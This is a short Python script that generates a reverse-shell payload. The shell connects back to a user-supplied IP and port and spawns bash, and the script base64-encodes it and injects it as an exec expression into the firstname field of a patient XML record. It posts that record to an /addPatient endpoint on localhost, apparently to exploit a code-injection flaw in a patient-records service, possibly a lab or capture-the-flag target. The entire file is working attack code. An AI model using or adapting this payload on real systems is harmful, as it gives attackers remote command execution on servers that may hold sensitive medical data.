import base64

def generate_payload():
    print("--- Reverse Shell Payload Generator ---")
    
    target_ip = input("Input Target IP: ").strip()
    target_port = input("Input Target Port: ").strip()
    
    raw_py_code = f'import socket,os,pty;s=socket.socket();s.connect(("{target_ip}",{target_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    
    b64_payload = base64.b64encode(raw_py_code.encode()).decode()
    
    final_payload = (
        f"python3 -c 'import urllib.request; "
        f"b64=\"{b64_payload}\"; "
        f"inj=\"{{exec(__import__(\\\"base64\\\").b64decode(\\\"{b64_payload}\\\").decode())}}\"; "
        f"xml=\"<patient><firstname>\"+inj+\"</firstname><lastname>Doe</lastname><timestamp>2026</timestamp><sender_app>P</sender_app><id>1</id><birth_date>01/01/1990</birth_date><gender>M</gender></patient>\"; "
        f"req=urllib.request.Request(\"http://127.0.0.1:54321/addPatient\",data=xml.encode(),headers={{\"Content-Type\":\"application/xml\"}}); "
        f"urllib.request.urlopen(req)'"
    )

    print("\n" + "="*50)
    print("Generated Payload:")
    print("="*50)
    print(final_payload)
    print("="*50)

if __name__ == "__main__":
    generate_payload()
